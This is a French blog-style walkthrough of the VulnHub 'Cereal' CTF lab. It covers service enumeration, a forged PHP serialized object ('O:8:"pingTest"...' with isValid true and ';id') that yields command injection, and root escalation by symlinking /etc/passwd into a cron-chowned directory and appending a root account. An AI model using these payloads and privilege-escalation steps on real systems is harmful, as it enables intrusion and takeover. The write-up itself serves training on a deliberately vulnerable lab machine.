---
title: "Solution du CTF Cereal de VulnHub"
tags: [CTF,VulnHub]
---

### Cereal Killer

[Cereal](https://vulnhub.com/entry/cereal-1,703/) était un autre CTF bien cool proposé sur VulnHub.

Le mauvais point, c'est qu'il y a beaucoup de services (inutiles) et comme on suppose à un moment qu'il faut brute-forcer un compte, ça prend beaucoup de temps.

Spoiler : il n'y a aucun compte à brute-forcer, mais il faut bien énumérer les services web.

```console
$ sudo nmap -sCV --script vuln -T5 -p- 192.168.56.133
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-09 13:39 CEST
Nmap scan report for 192.168.56.133
Host is up (0.00014s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 3.0.3
| vulners: 
|   vsftpd 3.0.3: 
|       CVE-2021-30047  7.5     https://vulners.com/cve/CVE-2021-30047
|_      CVE-2021-3618   7.4     https://vulners.com/cve/CVE-2021-3618
22/tcp    open  ssh        OpenSSH 8.0 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.0: 
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    10.0    https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       PACKETSTORM:173661      9.8     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
|       F0979183-AE88-53B4-86CF-3AF0523F3807    9.8     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807  *EXPLOIT*
--- snip ---
|_      PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
80/tcp    open  http       Apache httpd 2.4.37 (())
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-trace: TRACE is enabled
| http-enum: 
|   /blog/: Blog
|   /admin/: Possible admin folder
|   /admin/index.php: Possible admin folder
|   /phpinfo.php: Possible information file
|   /blog/wp-login.php: Wordpress login page.
|_  /icons/: Potentially interesting folder w/ directory listing
|_http-dombased-xss: Couldn't find any DOM based XSS.
| vulners: 
|   cpe:/a:apache:http_server:2.4.37: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
--- snip ---
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4  *EXPLOIT*
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Apache/2.4.37 ()
139/tcp   open  tcpwrapped
445/tcp   open  tcpwrapped
3306/tcp  open  mysql      MariaDB 10.3.24 or later (unauthorized)
11111/tcp open  tcpwrapped
22222/tcp open  tcpwrapped
22223/tcp open  tcpwrapped
33333/tcp open  tcpwrapped
33334/tcp open  tcpwrapped
44441/tcp open  http       Apache httpd 2.4.37 (())
| http-aspnet-debug: 
|_  status: DEBUG is enabled
| http-enum: 
|_  /icons/: Potentially interesting folder w/ directory listing
|_http-trace: TRACE is enabled
|_http-server-header: Apache/2.4.37 ()
| vulners: 
|   cpe:/a:apache:http_server:2.4.37: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       PACKETSTORM:181114      9.8     https://vulners.com/packetstorm/PACKETSTORM:181114      *EXPLOIT*
--- snip ---
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4  *EXPLOIT*
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
44444/tcp open  tcpwrapped
55551/tcp open  tcpwrapped
55555/tcp open  tcpwrapped
MAC Address: 08:00:27:D1:A7:DD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.49 seconds
```

On a un `Samba` qui ne veut pas de nous, un FTP avec rien d'intéressant à l'intérieur, des ports ouverts, mais qui ne communiquent pas, ainsi que deux ports HTTP. 

J'ai commencé par énumérer sur le port 80 :
```console
$ feroxbuster -u http://192.168.56.133/ -w DirBuster-0.12/directory-list-2.3-big.txt -n -x php,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.133/
 🚀  Threads               │ 50
 📖  Wordlist              │ list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [php, html]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        7l       20w      235c http://192.168.56.133/blog
301        7l       20w      236c http://192.168.56.133/admin
200      887l     4659w        0c http://192.168.56.133/phpinfo.php
--- snip ---
```

`phpinfo.php` mentionne le nom d'hôte `cereal.ctf` et on retrouve ce hostname dans le Wordpress installé à `/blog/`.

Je l'ajoute donc dans mon `/etc/hosts`.

J'ai lancé Nuclei sur le Wordpress, ça a remonté la présence d'un utilisateur `cereal` :

```
[wp-user-enum:usernames] [http] [low] http://cereal.ctf/blog/?rest_route=/wp/v2/users/ [cereal,Cereal]
[CVE-2017-5487:usernames] [http] [medium] http://cereal.ctf/blog/?rest_route=/wp/v2/users/ [cereal,Cereal]
[addeventlistener-detect] [http] [info] http://cereal.ctf/blog/
[apache-detect] [http] [info] http://cereal.ctf/blog/ [Apache/2.4.37 ()]
[php-detect] [http] [info] http://cereal.ctf/blog/ [7.2.24]
[metatag-cms] [http] [info] http://cereal.ctf/blog/ [WordPress 5.7.2]
```

À partir de là, j'ai tenté de brute-forcer le compte wordpress, le ftp, énumérer les plugins, etc. Ça n'a rien donné.

Idem pour le formulaire présent à `/admin`.

Finalement l'énumération des virtual hosts sur le port 44441 a été plus fructueuse :

```console
$ ffuf -u http://cereal.ctf:44441/ -w fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt -H "Host: FUZZ.cereal.ctf" -fs 15

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://cereal.ctf:44441/
 :: Wordlist         : FUZZ: fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt
 :: Header           : Host: FUZZ.cereal.ctf
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15
________________________________________________

secure                  [Status: 200, Size: 1538, Words: 133, Lines: 50, Duration: 2379ms]
:: Progress: [50000/50000] :: Job [1/1] :: 2898 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

### Forger pour mieux régner

Sur `secure.cereal.ctf` on trouve un formulaire qui demande une adresse IP pour faire un pinger.

Ce script n'est pas vulnérable à une injection de commande classique, mais en regardant le code, il est évident qu'il y a quelque chose de particulier :

```html
<html>
<head>
<script src="http://secure.cereal.ctf:44441/php.js"></script>
<script>
function submit_form() {
		var object = serialize({ipAddress: document.forms["ipform"].ip.value});
		object = object.substr(object.indexOf("{"),object.length);
		object = "O:8:\"pingTest\":1:" + object;
		document.forms["ipform"].obj.value = object;
		document.getElementById('ipform').submit();
}
</script>
<link rel='stylesheet' href='http://secure.cereal.ctf:44441/style.css' media='all' />
<title>Ping Test</title>
</head>
<body>
<div class="form-body">
<div class="row">
    <div class="form-holder">
	<div class="form-content">
	    <div class="form-items">
		<h3>Ping Test</h3>
		
		<form method="POST" action="/" id="ipform" onsubmit="submit_form();" class="requires-validation" novalidate>

		    <div class="col-md-12">
			<input name="obj" type="hidden" value="">
		       <input class="form-control" type="text" name="ip" placeholder="IP Address" required>
		    </div>
		<br />
		    <div class="form-button mt-3">
			<input type="submit" value="Ping!">
			<br /><br /><textarea></textarea>
		    </div>
		</form>
```

Le javascript `php.js` est capable de sérialiser un objet Javascript vers un objet sérialisé PHP.

Par example si on rentre `192.168.56.1` comme adresse IP, le script envoie deux paramètres :

- `obj` qui vaut `O:8:"pingTest":1:{s:9:"ipAddress";s:12:"192.168.56.1";}`
- `ip` qui vaut `192.168.56.1`

On est donc sur l'exploitation d'une désérialisation. Il faut parvenir à forger un objet spécial qui permettra d'exécuter du code.

Seulement pour faire ce genre de choses, il faut disposer du code PHP de la page.

Une énumération des fichiers et dossiers a remonté un dossier de backup :

```
200      123l      447w     3699c http://secure.cereal.ctf:44441/php
200      149l      278w     3118c http://secure.cereal.ctf:44441/style
200       50l      140w        0c http://secure.cereal.ctf:44441/index
200       50l      140w        0c http://secure.cereal.ctf:44441/index.php
403        7l       20w      199c http://secure.cereal.ctf:44441/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html
301        7l       20w      247c http://secure.cereal.ctf:44441/back_en
```

Ce dossier `back_en` donne un 403 donc impossible de lister les fichiers. Il m'aura fallu utiliser la bonne wordlist avant de trouver quelque chose :

```console
$ feroxbuster -u http://secure.cereal.ctf:44441/back_en/ -w wordlists/files/Filenames_or_Directories_All.wordlist -n
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://secure.cereal.ctf:44441/back_en/
 🚀  Threads               │ 50
 📖  Wordlist              │ wordlists/files/Filenames_or_Directories_All.wordlist
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
403        7l       20w      199c http://secure.cereal.ctf:44441/back_en/.htpasswd
200       79l      155w     1814c http://secure.cereal.ctf:44441/back_en/index.php.bak
403        7l       20w      199c http://secure.cereal.ctf:44441/back_en/.htaccess
403        7l       20w      199c http://secure.cereal.ctf:44441/back_en/.htpasswds
[####################] - 10s    45522/45522   0s      found:4       errors:2      
[####################] - 10s    45522/45522   4417/s  http://secure.cereal.ctf:44441/back_en/
```

Cette fois on a le code de la classe `pingTest` :

```php
<?php

class pingTest {
        public $ipAddress = "127.0.0.1";
        public $isValid = False;
        public $output = "";

        function validate() {
                if (!$this->isValid) {
                        if (filter_var($this->ipAddress, FILTER_VALIDATE_IP))
                        {
                                $this->isValid = True;
                        }
                }
                $this->ping();

        }

        public function ping()
        {
                if ($this->isValid) {
                        $this->output = shell_exec("ping -c 3 $this->ipAddress");
                }
        }

}

if (isset($_POST['obj'])) {
        $pingTest = unserialize(urldecode($_POST['obj']));
} else {
        $pingTest = new pingTest;
}

$pingTest->validate();
```

On voit qu'un filtre est présent pour vérifier le format d'adresse IP, mais ce filtre est utilisé seulement si l'attribut `isValid` vaut `False`, ce qui est la valeur par défaut.

Il faut simplement qu'on forge un objet avec la bonne valeur pour atteindre l'exécution de commande en bypassant le filtre.

J'ai écrit le code suivant :

```php
<?php
class pingTest {
    public $ipAddress;
    public $isValid = False;
}

$exploit = new pingTest();
$exploit->ipAddress = ";id";
$exploit->isValid = True;
echo serialize($exploit);
?>
```

Celui-ci donne cet output :

```
O:8:"pingTest":2:{s:9:"ipAddress";s:3:";id";s:7:"isValid";b:1;}
```

Une fois intégré dans la requête, j'obtiens bien une RCE :

```console
$ curl -XPOST --data 'obj=O%3A8%3A%22pingTest%22%3A2%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A3%3A%22%3Bid%22%3Bs%3A7%3A%22isValid%22%3Bb%3A1%3B%7D&ip=192.168.56.1' http://secure.cereal.ctf:44441/
--- snip ---
                        <br /><br /><textarea>uid=48(apache) gid=48(apache) groups=48(apache)
--- snip ---
```

### Gangnam Style

Un shell interactif récupéré, je fouille un peu et découvre par exemple que l'interface dans `/admin` est une coquille vide.

J'ai récupéré les identifiants de la base MySQL dans la configuration Wordpress :

```console
bash-4.4$ grep DB_ wp-config.php 
define( 'DB_NAME', 'newuser' );
define( 'DB_USER', 'newuser' );
define( 'DB_PASSWORD', 'VerySecureRandomPassword!' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8mb4' );
define( 'DB_COLLATE', '' );
```

Le hash obtenu a résisté à `rockyou`.

```sql
MariaDB [newuser]> select * from wp_users;
+----+------------+------------------------------------+---------------+-------------------+----------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url                   | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+-------------------+----------------------------+---------------------+---------------------+-------------+--------------+
|  1 | Cereal     | $P$Bdbc4Ngj9otXPIICjwE/6QV8UQvRcU. | cereal        | cereal@cereal.ctf | http://192.168.178.53/blog | 2021-05-29 12:38:54 |                     |           0 | Cereal       |
+----+------------+------------------------------------+---------------+-------------------+----------------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.001 sec)
```

Le dossier de l'utilisateur `rocky` a des permissions suspectes :

```console
bash-4.4$ ls /home/
total 0
drwxr-xr-x.  3 root  root    19 May 29  2021 .
dr-xr-xr-x. 17 root  root   244 May 29  2021 ..
drwxrwxr-x.  4 rocky apache 147 May 29  2021 rocky
```

Mais en dehors du flag, je n'ai rien trouvé :

```console
bash-4.4$ cat local.txt 
aaa87365bf3dc0c1a82aa14b4ce26bbc
```

`LinPEAS` indiquait que le système était vulnérable à `PwnKit` mais ça n'a pas fonctionné.

J'ai finalement sorti `pspy` et après quelques minutes, j'ai vu ça :

```console
2025/07/09 15:20:02 CMD: UID=0    PID=70454  | /bin/sh -c /bin/bash /usr/share/scripts/chown.sh 
2025/07/09 15:20:02 CMD: UID=0    PID=70455  | /bin/bash /usr/share/scripts/chown.sh
```

Ce script est vulnérable à cause du wildcard utilisé. On va pouvoir utiliser un lien symbolique :

```console
bash-4.4$ cat /usr/share/scripts/chown.sh
chown rocky:apache /home/rocky/public_html/*
bash-4.4$ ln -s /etc/passwd /home/rocky/public_html/passwd
```

J'ai attendu encore un moment, mais ça a fonctionné :

```console
bash-4.4$ ./pspy64 | grep chown
2025/07/09 15:29:39 CMD: UID=48   PID=76203  | grep chown 
2025/07/09 15:30:01 CMD: UID=0    PID=77096  | /bin/bash /usr/share/scripts/chown.sh 
2025/07/09 15:30:01 CMD: UID=0    PID=77097  | chown rocky:apache /home/rocky/public_html/back_en /home/rocky/public_html/index.php /home/rocky/public_html/passwd /home/rocky/public_html/php.js /home/rocky/public_html/style.css 
^Cbash-4.4$ ls -al /etc/passwd
-rwxrwxr-x. 1 rocky apache 1.6K May 29  2021 /etc/passwd
bash-4.4$ echo devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh >> /etc/passwd
bash-4.4$ su devloop
Password: 
sh-4.4# cd /root
sh-4.4# ls
anaconda-ks.cfg  listener.sh  proof.txt
sh-4.4# cat proof.txt
Well done! You have completed Cereal.

  ____                    _ 
 / ___|___ _ __ ___  __ _| |
| |   / _ \ '__/ _ \/ _` | |
| |__|  __/ | |  __/ (_| | |
 \____\___|_|  \___|\__,_|_|
                            

This box was brought to you by Bootlesshacker.

Follow me on Twitter: @bootlesshacker
My website: https://www.bootlesshacker.com

Root Flag: 1aeb5db4e979543cb807cfd90df77763
```

Effectivement le crontab s'exécute toutes les 10 minutes. Un peu long pour un CTF.

```console
sh-4.4# crontab -l
*/10 * * * * /bin/bash /usr/share/scripts/chown.sh
```
